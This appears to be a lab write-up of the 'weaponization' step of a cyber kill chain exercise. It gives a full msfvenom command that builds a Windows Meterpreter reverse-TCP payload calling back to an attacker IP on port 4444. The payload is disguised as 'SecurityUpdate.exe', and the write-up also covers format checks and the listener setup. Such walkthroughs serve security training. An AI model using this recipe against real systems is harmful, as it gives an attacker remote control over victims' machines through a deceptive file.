# 🧪 Weaponization Phase

## 🎯 Objective

Create a malicious payload that, when executed by the victim, initiates a reverse connection and grants the attacker remote access.

---

### ⚙️ Steps

#### 🛠️ Choosing the Exploit Mechanism

* The attacker chooses to use **MSFVenom**, a payload generator included in **Metasploit**.
* A **reverse TCP shell** payload is selected to enable remote control of the victim's system.

#### 💾 Generating the Payload

* The payload is compiled into a 64-bit Windows executable (PE32+).
* It is named `SecurityUpdate.exe` to mimic a legitimate file and avoid raising suspicion.

![payload creation](https://github.com/user-attachments/assets/a7b94074-04e0-431c-b011-2252d538c3de)

---

### 🧬 Payload Generation Command

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.19.19.134 LPORT=4444 -f exe -o SecurityUpdate.exe
```

---

### 📘 Command Breakdown

| Argument                                 | Description                                                     |
| ---------------------------------------- | --------------------------------------------------------------- |
| `msfvenom`                               | Payload generation tool from the Metasploit Framework.          |
| `-p windows/x64/meterpreter/reverse_tcp` | Specifies a 64-bit reverse TCP Meterpreter payload for Windows. |
| `LHOST=10.19.19.134`                     | IP address of the attacker (listener).                          |
| `LPORT=4444`                             | Port on the attacker’s machine to receive the reverse shell.    |
| `-f exe`                                 | Output format: Windows executable file.                         |
| `-o SecurityUpdate.exe`                  | Output file name.                                               |

---

### 🧾 Verifying Payload Format

Run the following command:

```bash
file SecurityUpdate.exe
```

**Expected Output:**

```
SecurityUpdate.exe: PE32+ executable (GUI) x86-64, for MS Windows, 3 sections
```

✔️ **64-bit architecture**
✔️ **Graphical User Interface (GUI)**
✔️ **Windows Portable Executable (PE) format**

---

### 🖥️ Preparing the Attacker’s Listener

* The attacker configures their machine to listen on **port 4444** using **Metasploit’s multi/handler** module.
* Once the victim executes the payload, the reverse shell will connect to the attacker, granting full control.
